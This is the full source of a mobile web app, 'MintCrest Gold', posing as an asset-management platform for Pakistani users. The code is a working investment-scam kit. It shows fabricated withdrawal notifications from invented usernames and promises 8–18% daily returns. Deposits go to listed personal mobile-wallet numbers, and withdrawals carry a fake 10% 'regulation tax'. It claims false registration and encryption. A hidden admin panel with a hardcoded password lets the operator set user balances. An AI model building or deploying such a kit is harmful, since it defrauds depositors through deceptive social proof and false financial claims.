<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Gold | Trusted Asset Management</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        
        :root { --bg: #ffffff; --card: #f8fafc; --text: #0f172a; --accent: #2563eb; --border: #e2e8f0; }
        .dark { --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --accent: #3b82f6; --border: #334155; }
        
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); transition: 0.3s; overflow-x: hidden; scroll-behavior: smooth; }
        .glass { background: var(--card); border: 1px solid var(--border); box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .nav-btn { opacity: 0.5; transition: 0.3s; }
        .active-tab { opacity: 1; color: var(--accent); font-weight: 800; }
        
        #fake-notif { position: fixed; bottom: 120px; left: 50%; transform: translateX(-50%); z-index: 1000; transition: 0.5s; opacity: 0; }
        #fake-notif.show { opacity: 1; transform: translateX(-50%) translateY(-10px); }
        
        ::-webkit-scrollbar { display: none; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="fake-notif" class="glass px-6 py-3 rounded-2xl flex items-center gap-3 border-l-4 border-blue-600 w-[90%] max-w-sm">
        <div class="text-xl">✅</div>
        <div>
            <p id="notif-user" class="text-[10px] font-bold text-blue-600 uppercase">User786</p>
            <p id="notif-msg" class="text-[9px] opacity-70">Just withdrawn ₨ 5,000</p>
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[10000] bg-white flex flex-col items-center justify-center p-8 text-center">
        <div class="w-20 h-20 bg-blue-600 rounded-[2rem] flex items-center justify-center text-white text-4xl font-black mb-6 shadow-xl shadow-blue-200">M</div>
        <h1 onclick="adminTap()" class="text-4xl font-black tracking-tighter mb-2 text-slate-900">MINTCREST GOLD</h1>
        <p class="text-slate-400 text-[10px] uppercase tracking-widest mb-12 font-bold">Secure Asset Node</p>
        <div class="w-full max-w-sm">
            <input type="text" id="user-name" placeholder="Full Name" class="w-full p-5 rounded-2xl bg-slate-50 border border-slate-200 outline-none text-center font-bold mb-4 focus:ring-2 ring-blue-500 transition-all">
            <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-xs uppercase text-white shadow-lg shadow-blue-200 active:scale-95 transition-all">Secure Login</button>
        </div>
    </section>

    <header class="p-6 flex justify-between items-center fixed top-0 w-full z-50 bg-white/80 backdrop-blur-md dark:bg-slate-900/80">
        <div class="flex items-center gap-2">
            <div class="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center text-white font-black text-xs">M</div>
            <span class="font-bold text-sm">MintCrest</span>
        </div>
        <div class="flex gap-4">
            <button onclick="toggleTheme()" class="text-xl">🌓</button>
            <button onclick="logout()" class="text-[10px] font-black uppercase text-red-500">Exit</button>
        </div>
    </header>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pt-24 pb-32 px-6">
        
        <div id="p-home" class="page active-page">
            <div class="bg-blue-600 p-8 rounded-[2.5rem] mb-6 shadow-xl shadow-blue-100 relative overflow-hidden text-white">
                <p class="text-[10px] opacity-70 font-bold uppercase mb-1">Available Balance</p>
                <h2 class="text-4xl font-black tracking-tight" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex justify-between items-center bg-white/10 p-4 rounded-2xl">
                    <span class="text-[9px] font-black uppercase">Total Profit: <span id="v-profit">0</span></span>
                    <button onclick="dailyBonus()" class="bg-white text-blue-600 px-4 py-2 rounded-xl text-[9px] font-black uppercase">Claim Bonus 🎁</button>
                </div>
            </div>

            <marquee class="mb-6 text-[10px] font-bold text-blue-600 uppercase" id="ticker-text">Welcome to the future of asset management. Your capital is secure with AES-256 encryption.</marquee>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('wallet')" class="glass p-6 rounded-3xl text-center">
                    <div class="text-2xl mb-1">📥</div>
                    <span class="text-[10px] font-black uppercase">Deposit</span>
                </button>
                <button onclick="changePage('withdraw')" class="glass p-6 rounded-3xl text-center">
                    <div class="text-2xl mb-1">📤</div>
                    <span class="text-[10px] font-black uppercase">Withdraw</span>
                </button>
            </div>

            <div class="glass p-5 rounded-3xl mb-6 flex gap-2">
                <input type="text" id="promo-input" placeholder="Promo Code" class="flex-1 bg-transparent text-[10px] font-bold outline-none px-2">
                <button onclick="applyPromo()" class="bg-slate-900 text-white dark:bg-blue-600 px-6 py-3 rounded-2xl text-[9px] font-black uppercase">Apply</button>
            </div>

            <div class="grid grid-cols-2 gap-3">
                <a href="https://wa.me/yourgroup" class="glass p-4 rounded-2xl flex items-center justify-center gap-2 border-green-100">
                    <span class="text-green-500 font-bold">WhatsApp</span>
                </a>
                <button onclick="changePage('support')" class="glass p-4 rounded-2xl flex items-center justify-center gap-2">
                    <span class="text-blue-500 font-bold">Help Desk</span>
                </button>
            </div>
        </div>

        <div id="p-invest" class="page">
            <h3 class="font-black text-center text-lg mb-6 text-slate-800 dark:text-white">Active Portfolios (25)</h3>
            <div id="plans-list" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-wallet" class="page">
            <div class="glass p-8 rounded-[2.5rem]">
                <h3 class="font-black text-center mb-6 uppercase text-blue-600">Funding Gateway</h3>
                <div class="space-y-2 mb-8 text-[10px] font-bold">
                    <div class="flex justify-between p-4 bg-slate-50 rounded-xl dark:bg-slate-800"><span>Jazz/Sada</span><span class="text-blue-600">03705519562</span></div>
                    <div class="flex justify-between p-4 bg-slate-50 rounded-xl dark:bg-slate-800"><span>Easypaisa</span><span class="text-green-600">03379827882</span></div>
                </div>
                <input type="number" id="d-amt" placeholder="Amount (Min 200)" class="w-full p-4 rounded-xl bg-slate-50 border border-slate-200 mb-3 text-center font-bold dark:bg-slate-800 dark:border-slate-700">
                <input type="text" id="d-tid" placeholder="TID Number" class="w-full p-4 rounded-xl bg-slate-50 border border-slate-200 mb-4 text-center font-bold uppercase dark:bg-slate-800 dark:border-slate-700">
                <p class="text-[8px] mb-2 font-bold opacity-50 uppercase">Upload Receipt Screenshot:</p>
                <input type="file" id="d-file" accept="image/*" class="w-full mb-6 text-[10px]">
                <button onclick="subDep()" class="w-full bg-blue-600 text-white py-5 rounded-2xl font-black text-[10px] uppercase">Verify Funding</button>
            </div>
        </div>

        <div id="p-support" class="page">
            <div class="glass p-8 rounded-[2.5rem]">
                <h3 class="font-black text-center mb-6 uppercase text-blue-600">Inquiry Node</h3>
                <textarea id="sup-msg" placeholder="Tell us your issue..." class="w-full h-32 p-4 rounded-xl bg-slate-50 border border-slate-200 mb-4 text-xs font-bold dark:bg-slate-800 dark:border-slate-700"></textarea>
                <button onclick="sendSup()" class="w-full bg-slate-900 text-white py-5 rounded-2xl font-black text-[10px] uppercase">Send Message</button>
                <div id="sup-replies" class="mt-8 space-y-4"></div>
            </div>
        </div>

        <div id="p-info" class="page">
            <div class="glass p-8 rounded-[2.5rem] space-y-6 text-[10px] leading-relaxed">
                <div><h4 class="font-black text-blue-600 uppercase mb-1">Company Details</h4><p>MintCrest Gold is a registered authority in decentralized finance. We offer liquidity solutions to individual investors globally.</p></div>
                <div><h4 class="font-black text-blue-600 uppercase mb-1">Privacy Policy</h4><p>Your data is encrypted using AES-256 protocols. We do not share identity details with third-party nodes.</p></div>
                <div><h4 class="font-black text-blue-600 uppercase mb-1">Regulation</h4><p>All withdrawals are subject to a 10% regulation tax to maintain system liquidity.</p></div>
            </div>
        </div>

        <div id="p-withdraw" class="page text-center">
            <div class="glass p-8 rounded-[2.5rem] border-t-8 border-slate-900">
                <h3 class="font-black text-slate-900 dark:text-white mb-2 uppercase text-lg">Liquidation</h3>
                <p class="text-[8px] opacity-50 mb-8 font-bold uppercase italic">10% Regulation Tax Deducted Automatically</p>
                <input type="number" id="w-amt" placeholder="Amount (PKR)" class="w-full p-4 rounded-xl bg-slate-50 border border-slate-200 mb-4 text-center font-bold dark:bg-slate-800">
                <input type="text" id="w-acc" placeholder="Account Name & Number" class="w-full p-4 rounded-xl bg-slate-50 border border-slate-200 mb-8 text-center font-bold dark:bg-slate-800">
                <button onclick="subWd()" class="w-full bg-slate-900 text-white py-5 rounded-2xl font-black text-[10px] uppercase">Authorize Withdrawal</button>
            </div>
        </div>

    </main>

    <div id="admin-panel" class="fixed inset-0 bg-white z-[50000] hidden overflow-y-auto px-6 pt-10 dark:bg-slate-900">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-blue-600 uppercase">Command Node</h2>
            <button onclick="closeAdmin()" class="bg-red-500 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase">Lock</button>
        </div>
        <div class="grid grid-cols-2 gap-2 mb-6">
            <button onclick="admSec('req')" class="bg-blue-600 text-white p-4 rounded-xl text-[9px] font-black uppercase">Requests</button>
            <button onclick="admSec('tools')" class="bg-slate-100 p-4 rounded-xl text-[9px] font-black uppercase dark:bg-slate-800">Tools</button>
        </div>
        <div id="adm-req-list" class="adm-sec space-y-4"></div>
        <div id="adm-tools" class="adm-sec hidden space-y-4 pb-20">
            <div class="glass p-6 rounded-2xl">
                <h4 class="text-[10px] font-black uppercase mb-4 text-blue-600">User Adjustment</h4>
                <input type="text" id="am-u" placeholder="User Name" class="w-full p-3 rounded-lg bg-slate-50 border mb-2 text-xs dark:bg-slate-800">
                <input type="number" id="am-v" placeholder="Amount" class="w-full p-3 rounded-lg bg-slate-50 border mb-4 text-xs dark:bg-slate-800">
                <div class="flex gap-2">
                    <button onclick="manEd('balance')" class="flex-1 bg-slate-900 text-white p-3 rounded-lg text-[8px] font-black">ADD BAL</button>
                    <button onclick="manEd('profit')" class="flex-1 bg-blue-600 text-white p-3 rounded-lg text-[8px] font-black">ADD PROFIT</button>
                </div>
            </div>
            <div class="glass p-6 rounded-2xl">
                <h4 class="text-[10px] font-black uppercase mb-4 text-slate-800 dark:text-white">Create Promo Code</h4>
                <input type="text" id="am-p" placeholder="CODE NAME" class="w-full p-3 rounded-lg bg-slate-50 border mb-2 text-xs dark:bg-slate-800">
                <input type="number" id="am-pv" placeholder="Reward Value" class="w-full p-3 rounded-lg bg-slate-50 border mb-4 text-xs dark:bg-slate-800">
                <button onclick="createP()" class="w-full bg-slate-900 text-white p-4 rounded-lg text-[9px] font-black">ACTIVATE CODE</button>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden bg-white/80 backdrop-blur-md border-t p-6 flex justify-around items-center fixed bottom-0 w-full z-[4000] dark:bg-slate-900/80">
        <button onclick="changePage('home')" id="n-home" class="nav-btn active-tab flex flex-col items-center">
            <span class="text-xl">🏠</span>
            <span class="text-[8px] uppercase mt-1">Home</span>
        </button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn flex flex-col items-center">
            <span class="text-xl">📈</span>
            <span class="text-[8px] uppercase mt-1">Plans</span>
        </button>
        <button onclick="changePage('info')" id="n-info" class="nav-btn flex flex-col items-center">
            <span class="text-xl">📜</span>
            <span class="text-[8px] uppercase mt-1">Terms</span>
        </button>
        <button onclick="changePage('wallet')" id="n-wallet" class="nav-btn flex flex-col items-center">
            <span class="text-xl">💰</span>
            <span class="text-[8px] uppercase mt-1">Wallet</span>
        </button>
    </nav>

    <script>
        // CONFIG
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0;

        // 25 PLANS
        const plans = [];
        for(let i=1; i<=25; i++) {
            plans.push({ name: `Fleet Tier ${i}`, price: 200 * i, daily: (8 + (i*0.4)).toFixed(1) });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                list.innerHTML += `<div onclick="buyPlan(${p.price}, '${p.name}')" class="glass p-5 rounded-2xl flex justify-between items-center active:scale-95 transition-all">
                    <div><h4 class="font-black text-[10px] uppercase text-slate-800 dark:text-white">${p.name}</h4><p class="text-[9px] text-blue-600 font-bold uppercase">${p.daily}% Daily Return</p></div>
                    <div class="text-md font-black italic">₨ ${p.price.toLocaleString()}</div>
                </div>`;
            });
        }

        // AUTH
        async function login() {
            const n = document.getElementById('user-name').value.trim().toLowerCase(); if(!n) return;
            localStorage.setItem('mc_user', n);
            const ref = db.collection("users").doc(n); const d = await ref.get();
            if(!d.exists) await ref.set({ name: n, balance: 0, profit: 0, lastBonus: 0, time: Date.now(), redeemed: [] });
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            sync(n); renderPlans(); startFakeNotif();
        }

        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function toggleTheme() { document.documentElement.classList.toggle('dark'); }

        function sync(n) {
            db.collection("users").doc(n).onSnapshot(d => { user = d.data(); document.getElementById('v-bal').innerText = "₨ "+user.balance.toLocaleString(); document.getElementById('v-profit').innerText = "₨ "+user.profit.toLocaleString(); });
            db.collection("settings").doc("news").onSnapshot(d => { if(d.exists) document.getElementById('ticker-text').innerText = d.data().msg; });
            db.collection("support").where("user", "==", n).onSnapshot(s => {
                const list = document.getElementById('sup-replies'); list.innerHTML = '';
                s.forEach(doc => { const m = doc.data(); list.innerHTML += `<div class="p-3 rounded-lg bg-slate-50 dark:bg-slate-800 text-[9px] font-bold"><p class="opacity-50">${m.from==='admin'?'ADMIN':'YOU'}</p><p>${m.message}</p></div>`; });
            });
        }

        async function subDep() {
            const a = document.getElementById('d-amt').value; const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(!a || !t || !f) return alert("All fields including receipt photo required! 😘");
            try {
                const sRef = storage.ref(`receipts/${Date.now()}_${user.name}`);
                await sRef.put(f); const url = await sRef.getDownloadURL();
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: url, type: "deposit", status: "pending", time: Date.now() });
                alert("Funding Logged! Wait for admin verification. 😘"); changePage('home');
            } catch(e) { alert("Upload Error!"); }
        }

        async function dailyBonus() {
            const now = Date.now();
            if(now - (user.lastBonus || 0) < 86400000) return alert("Wait 24h for next reward! 😘");
            const reward = Math.floor(Math.random() * 40) + 10;
            await db.collection("users").doc(user.name).update({ balance: firebase.firestore.FieldValue.increment(reward), lastBonus: now });
            alert(`Sweetie! ₨ ${reward} added! 😘`);
        }

        async function applyPromo() {
            const c = document.getElementById('promo-input').value.trim().toUpperCase(); if(!c) return;
            const ref = db.collection("promos").doc(c); const d = await ref.get();
            if(!d.exists || (user.redeemed && user.redeemed.includes(c))) return alert("Invalid or Expired Code! 😘");
            await db.collection("users").doc(user.name).update({ balance: firebase.firestore.FieldValue.increment(d.data().val), redeemed: firebase.firestore.FieldValue.arrayUnion(c) });
            alert("Code Redeemed! 😘");
        }

        async function subWd() {
            const a = parseInt(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value;
            if(!a || a > user.balance || !acc) return alert("Invalid amount or details! 😘");
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            alert("Withdrawal authorized! 😘"); changePage('home');
        }

        async function sendSup() {
            const m = document.getElementById('sup-msg').value; if(!m) return;
            await db.collection("support").add({ user: user.name, from: "user", message: m, time: Date.now() });
            document.getElementById('sup-msg').value = ''; alert("Message sent! 😘");
        }

        // ADMIN PANEL
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Pass:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function admSec(s) { document.querySelectorAll('.adm-sec').forEach(x=>x.classList.add('hidden')); document.getElementById('adm-'+s).classList.remove('hidden'); }

        async function syncAdm() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const rl = document.getElementById('adm-req-list'); rl.innerHTML = '';
                s.forEach(doc => {
                    const x = doc.data(); rl.innerHTML += `<div class="glass p-6 rounded-2xl mb-4">
                        <div class="flex justify-between font-black uppercase text-[10px] mb-2"><span class="text-blue-600">${x.user}</span><span>₨ ${x.amount}</span></div>
                        <p class="text-[8px] opacity-40 mb-3">${x.type} | ${x.tid||x.acc}</p>
                        ${x.proof ? `<a href="${x.proof}" target="_blank" class="block bg-slate-900 text-white text-center py-3 rounded-lg text-[9px] font-black uppercase mb-4">VIEW RECEIPT</a>` : ''}
                        <div class="flex gap-2">
                            <button onclick="hndReq('${doc.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 bg-blue-600 text-white py-3 rounded-lg text-[9px] font-black uppercase">Approve</button>
                            <button onclick="hndReq('${doc.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-red-600 text-white py-3 rounded-lg text-[9px] font-black uppercase">Reject</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function hndReq(id, u, amt, act, type) {
            if(act==='approved' && type==='deposit') await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(amt) });
            else if(act==='rejected' && type==='withdraw') await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(amt) });
            await db.collection("requests").doc(id).update({ status: act });
        }

        async function createP() { const c = document.getElementById('am-p').value.toUpperCase(); const v = parseInt(document.getElementById('am-pv').value); await db.collection("promos").doc(c).set({ val: v }); alert("Promo Live! 😘"); }
        async function manEd(f) { const u = document.getElementById('am-u').value.toLowerCase(); const v = parseInt(document.getElementById('am-v').value); await db.collection("users").doc(u).update({ [f]: firebase.firestore.FieldValue.increment(v) }); alert("Updated! 😘"); }

        // UTILS
        function startFakeNotif() {
            const users = ["Ali_Invest", "Sarah_Node", "Zain_Master", "Ayesha_Pro", "Kamran_VIP"];
            setInterval(() => {
                document.getElementById('notif-user').innerText = users[Math.floor(Math.random()*users.length)];
                document.getElementById('fake-notif').classList.add('show');
                setTimeout(() => document.getElementById('fake-notif').classList.remove('show'), 3000);
            }, 10000);
        }

        async function buyPlan(p, n) { if(user.balance < p) { alert("Insufficient Balance! Deposit first. 😘"); changePage('wallet'); } else { if(confirm(`Activate ${n}?`)) { await db.collection("users").doc(user.name).update({ balance: user.balance - p }); await db.collection("requests").add({ user: user.name, amount: p, type: "Plan: "+n, status: "approved", time: Date.now() }); alert("Portfolio Activated! 😘"); } } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab')); document.getElementById('n-'+p).classList.add('active-tab'); }
    </script>
</body>
</html>
